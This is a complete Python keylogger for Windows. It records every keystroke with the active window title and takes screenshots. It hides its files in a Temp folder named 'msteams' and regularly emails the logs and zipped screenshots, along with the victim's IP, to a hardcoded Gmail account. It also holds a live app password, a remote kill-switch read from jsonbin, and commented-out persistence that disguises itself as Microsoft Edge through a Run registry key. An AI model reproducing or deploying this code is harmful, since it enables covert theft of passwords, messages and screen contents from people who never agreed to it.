import keyboard
import ctypes
import win32gui
import datetime
import pyscreenshot
import os
import threading
import smtplib
from dotenv import load_dotenv
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from urllib.request import urlopen
from email import encoders
import re
import shutil
import requests
import getpass
from sys import executable
import sys
import platform
import subprocess
from PIL import ImageGrab

REPORT_INTERVAL = 20
POLLING_INTERVAL = 10
EMAIL = "ilove6841verymuch@gmail.com"
EMAIL_PASSWORD = "vyeg mhds cgge shmo"
USER_NAME = getpass.getuser()

working_folder = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams"
screenshots_folder = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\stuff"
log_file = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\log.txt"

curr_window = ""

def key_callback(event : keyboard.KeyboardEvent):
    global curr_window

    log_line = ""
    screenshot_line = ""
    
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    new_window = win32gui.GetWindowText(user32.GetForegroundWindow())

    if new_window != curr_window:
        curr_window = new_window

        # image = pyscreenshot.grab()
        image = ImageGrab.grab()
        total_screenshots = len(os.listdir(screenshots_folder))
        image.save(rf"{screenshots_folder}\image_{total_screenshots}.png")
        screenshot_line = f" | Screenshot taken: image_{total_screenshots}.png"

    log_line += f"Key: {event.name} | "
    log_line += f"{curr_window} | "


    dt = datetime.datetime.fromtimestamp(event.time)
    log_line += f"{dt}"
    log_line += screenshot_line

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(log_line + "\n")

    print(log_line)


def attach_file(msg, filepath):
    with open(filepath, "rb") as f:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(f.read())
    encoders.encode_base64(part)
    filename = os.path.basename(filepath)
    part.add_header("Content-Disposition", f"attachment; filename={filename}")
    msg.attach(part)

def send_report():
    print("Trying to send report")
    try:
        if os.listdir(screenshots_folder):
            print("Sending report")
            data = str(urlopen('http://checkip.dyndns.com/').read())
            ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
            msg = MIMEMultipart()
            msg['Subject'] = f"Report From {ip}"
            msg['From'] = EMAIL
            msg['To'] = EMAIL
            zip_path = shutil.make_archive("screenshots_zip", "zip", screenshots_folder)
            attach_file(msg, zip_path)
            attach_file(msg, log_file)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
                smtp_server.login(EMAIL, EMAIL_PASSWORD)
                smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())

            # clear files
            with open(log_file, "w", encoding="utf-8") as f:
                pass

            if os.path.exists(screenshots_folder):
                shutil.rmtree(screenshots_folder)
            os.makedirs(screenshots_folder)

    except Exception as e:
        print("Failed to send report")

    timer = threading.Timer(REPORT_INTERVAL, send_report)
    timer.daemon = True
    timer.start()

def check_flag():
    print("Checking flag")
    flag = "True"
    try:
        response = requests.get("https://api.jsonbin.io/v3/b/6a4b5550da38895dfe339f25/latest")
        flag = response.json()["record"]["flag"]
    except Exception as e:
        print("Failed to get flag")

    if flag != "True":
        cleanup()

    poller = threading.Timer(REPORT_INTERVAL, check_flag)
    poller.daemon = True
    poller.start()

def setup():
    print("setting up")
    if not os.path.exists(working_folder):
        print("making working folder")
        os.mkdir(working_folder)

    if not os.path.exists(screenshots_folder):
        print("making screenshots folder")
        os.mkdir(screenshots_folder)

    # setup persistence 

    # os_type = platform.system()
    # if os_type == "Windows":
    #     location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
    #     if not os.path.exists(location):
    #         shutil.copyfile(executable, location)
    #         subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)

    try: 
        data = str(urlopen('http://checkip.dyndns.com/').read())
        ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
        msg = MIMEMultipart()
        msg['Subject'] = f"Installed/Started on {ip}"
        msg['From'] = EMAIL
        msg['To'] = EMAIL

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(EMAIL, EMAIL_PASSWORD)
            smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
    except Exception as e:
        pass

def cleanup():
    print("Cleaning up")
    sys.exit(0)

def main():
    setup()
    keyboard.on_release(key_callback)
    timer = threading.Timer(REPORT_INTERVAL, send_report)
    timer.daemon = True
    timer.start()
    poller = threading.Timer(POLLING_INTERVAL, check_flag)
    poller.daemon = True
    poller.start()
    keyboard.wait()

if __name__ == "__main__":
    main()